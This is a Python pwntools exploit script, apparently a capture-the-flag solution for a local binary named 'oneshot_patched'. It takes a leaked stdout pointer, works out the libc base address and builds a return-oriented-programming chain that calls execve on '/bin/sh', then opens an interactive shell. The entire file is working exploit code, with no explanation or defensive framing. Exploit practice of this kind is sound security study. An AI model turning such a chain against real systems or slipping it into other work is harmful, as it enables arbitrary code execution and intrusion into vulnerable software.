from pwn import *

p = process("./oneshot_patched")
exe = ELF("./oneshot_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

input()
p.recvuntil(b"stdout: ")

leak_stdout = int(p.recvline().strip(), 16)

info(f"Leak: {hex(leak_stdout)}")

address_libc = leak_stdout - 0x3c5620
info(f"Libc address: {hex(address_libc)}")
libc.address = address_libc

pop_rdi = libc.address + 0x0000000000021102
pop_rsi = libc.address + 0x00000000000202e8
pop_rax = libc.address + 0x0000000000033544
bin_sh = next(libc.search(b"/bin/sh"))
syscall = libc.address + 0x00000000000026bf

payload = flat(
    b"\x00" * 40,
    p64(pop_rdi),
    p64(bin_sh),
    p64(pop_rsi),
    p64(0),
    p64(pop_rax),
    p64(0x3b),
    p64(syscall)
)
write("payload", payload)
info(f"Len: {len(payload)}")

p.sendafter(b"MSG: ", payload)

p.interactive()
